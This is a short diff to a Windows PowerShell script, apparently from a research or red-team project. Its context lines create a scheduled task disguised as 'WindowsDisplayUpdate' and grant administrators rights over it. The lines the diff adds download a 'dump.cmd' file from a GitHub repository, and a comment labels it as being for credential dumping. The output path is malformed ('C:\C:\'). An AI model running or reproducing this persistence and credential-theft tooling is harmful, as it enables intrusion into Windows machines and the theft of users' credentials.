@@ -131,6 +131,8 @@ schtasks /create /tn "WindowsDisplayUpdate" /tr "powershell.exe -ExecutionPolicy
 
 icacls "C:\Windows\System32\Tasks\WindowsDisplayUpdate" /grant Administrators:F
 
+# Download dump.cmd for credential dump
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/dump.cmd' -OutFile "C:\C:\Users\Public\dump.cmd"
 
 
     
